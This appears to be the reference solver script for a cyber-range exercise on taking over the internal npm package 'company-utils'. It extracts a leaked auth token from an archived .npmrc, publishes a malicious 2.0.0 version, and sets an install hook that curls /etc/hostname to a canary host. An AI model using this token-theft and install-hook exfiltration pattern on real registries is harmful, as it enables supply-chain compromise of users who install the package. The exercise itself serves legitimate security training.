"""Intended-path solver: squat company-utils with a leaked maintainer token."""

import re

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

CANARY_URL = "http://canary.company.internal/beacon?pkg=company-utils"


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    expected = ctx.expected_flags["claim-the-namespace"]
    with httpx.Client(base_url=ctx.url(), timeout=10) as client:
        entry = client.get("/registry/company-utils").json()
        assert entry["dist-tags"]["latest"] == "1.0.0", "unexpected registry state"

        npmrc = client.get("/evidence/ci-artifacts.npmrc").text
        token_match = re.search(r"_authToken=(npm_[0-9a-f]+)", npmrc)
        assert token_match, "no authToken in archived npmrc"

        res = client.post(
            "/publish",
            json={
                "name": "company-utils",
                "version": "2.0.0",
                "token": token_match.group(1),
                "install": f"curl -s {CANARY_URL} --data-binary @/etc/hostname",
            },
        )
        payload = res.json()
        assert payload.get("accepted"), f"publish rejected: {payload}"

        check = client.get("/takeover-check")

    flags = find_flags(check.text)
    captured = flags[0] if flags else None
    ok = captured == expected and "Takeover confirmed" in check.text
    detail = None if ok else f"publish={payload} check={check.status_code}"
    return SolveResult(
        results=[TaskResult(task_id="claim-the-namespace", ok=ok, captured=captured, detail=detail)]
    )
